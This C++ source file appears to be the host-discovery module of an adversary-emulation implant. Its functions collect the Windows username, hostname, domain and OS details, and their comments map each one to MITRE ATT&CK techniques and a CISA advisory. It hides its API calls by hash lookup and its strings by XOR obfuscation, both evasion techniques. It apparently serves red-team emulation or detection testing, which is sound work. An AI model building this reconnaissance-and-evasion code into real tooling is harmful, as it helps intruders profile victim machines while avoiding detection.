#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <Windows.h>
#include <format>
#include <stdexcept>
#include <string>
#include <errhandlingapi.h>
#include <Lmcons.h> // for UNLEN
#include "crypto/xor_obfuscation.hpp"
#include "discovery.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"

namespace discovery {

/*
 * GetUsername:
 *      About:
 *          Gets username in domain\username format using the GetUserNameExW API call. 
 *          If domain info is not available, returns username in SAM-compatible format.
 *      Result:
 *          std::string containing username
 *      MITRE ATT&CK Techniques:
 *          T1033: System Owner/User Discovery
 *          T1016: System Network Configuration Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
std::string GetUsername() {
    DWORD error_code;
    FP_GetUserNameExW getUserNameExW = (FP_GetUserNameExW)winapi_helper::GetAPI(0x9b5bb599, XOR_WIDE_LIT(L"Secur32.dll"), &error_code);
    if (getUserNameExW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for GetUserNameExW. Error code"), error_code));
        return std::string(XOR_LIT("Failed to get username."));
    }

    unsigned long buf_len = UNLEN + 1;
    wchar_t buffer[UNLEN + 1];
    if (!getUserNameExW(NameSamCompatible, buffer, &buf_len)) {
        DWORD error_code = GetLastError();
        XorLogger::LogError(std::format("{} {}", XOR_LIT("GetUserNameExW failed with error code"), error_code));
        return std::string(XOR_LIT("Unknown username"));
    }
    return string_util::wstring_to_string(std::wstring(buffer));
}

/*
 * GetHostname:
 *      About:
 *          Gets current hostname using the GetComputerNameW API call.
 *      Result:
 *          std::string containing hostname
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
std::string GetHostname() {
    DWORD error_code;
    FP_GetComputerNameW getComputerNameW = (FP_GetComputerNameW)winapi_helper::GetAPI(0xaa63bfcc, XOR_WIDE_LIT(L"kernel32.dll"), &error_code);
    if (getComputerNameW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for GetComputerNameW. Error code"), error_code));
        return std::string(XOR_LIT("Failed to get hostname."));
    }

    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
    unsigned long buf_len = MAX_COMPUTERNAME_LENGTH + 1;
    if (!getComputerNameW(buffer, &buf_len)) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to retrieve computer name. Error code"), GetLastError()));
        return std::string(XOR_LIT("Unknown hostname"));
    }
    return string_util::wstring_to_string(std::wstring(buffer));
}

/*
 * GetDomain:
 *      About:
 *          Gets current domain using the GetComputerNameExW API call. 
 *          If domain is not available, returns "No domain"
 *      Result:
 *          std::string containing domain
 *      MITRE ATT&CK Techniques:
 *          T1016: System Network Configuration Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
std::string GetDomain() {
    DWORD error_code;
    FP_GetComputerNameExW getComputerNameExW = (FP_GetComputerNameExW)winapi_helper::GetAPI(0xd252a609, XOR_WIDE_LIT(L"kernel32.dll"), &error_code);
    if (getComputerNameExW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for GetComputerNameExW. Error code"), error_code));
        return std::string(XOR_LIT("Failed to get domain."));
    }

    wchar_t buffer[256];
    unsigned long buf_len = 256;
    if (!getComputerNameExW(ComputerNameDnsDomain, buffer, &buf_len)) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to retrieve domain name. Error code"), GetLastError()));
        return std::string(XOR_LIT("Unknown domain"));
    }
    std::string converted = string_util::wstring_to_string(std::wstring(buffer));
    if (converted.length() == 0) {
        return std::string(XOR_LIT("No domain"));
    }
    return converted;
}

/*
 * GetOsArchitecture:
 *      About:
 *          Gets OS architecture using the GetNativeSystemInfo API call.
 *      Result:
 *          std::string containing OS architecture
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info
 */
std::string GetOsArchitecture() {
    SYSTEM_INFO sys_info;
    GetNativeSystemInfo(&sys_info);
    switch (sys_info.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "AMD64";
        case PROCESSOR_ARCHITECTURE_ARM:
            return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "ARM64";
        case PROCESSOR_ARCHITECTURE_IA64:
            return "IA64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        case PROCESSOR_ARCHITECTURE_UNKNOWN:
            return "Unknown";
        default:
            return "Unknown";
    }
}

/*
 * GetOsVersionString:
 *      About:
 *          Gets OS version string in "major.minor.build" format using the RtlGetVersion API call.
 *      Result:
 *          std::string containing OS version info
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion
 *          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion
 *          https://stackoverflow.com/a/36545162
 */
std::string GetOsVersionString() {
    DWORD error_code;
    FP_RtlGetVersion rtlGetVersion = (FP_RtlGetVersion)winapi_helper::GetAPI(0x3ca3aa1d, XOR_WIDE_LIT(L"ntdll.dll"), &error_code);
    if (rtlGetVersion == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for RtlGetVersion. Error code"), error_code));
        return std::string(XOR_LIT("Failed to get OS version."));
    }

    RTL_OSVERSIONINFOW ver_info;
    ver_info.dwOSVersionInfoSize = sizeof(ver_info);
    if (rtlGetVersion(&ver_info) == STATUS_SUCCESS) {
        return std::format("{}.{}.{}", ver_info.dwMajorVersion, ver_info.dwMinorVersion, ver_info.dwBuildNumber);
    } else {
        XorLogger::LogError(XOR_LIT("RtlGetVersion failed to get version information."));
        return std::string(XOR_LIT("Failed to get OS version."));
    }
}

}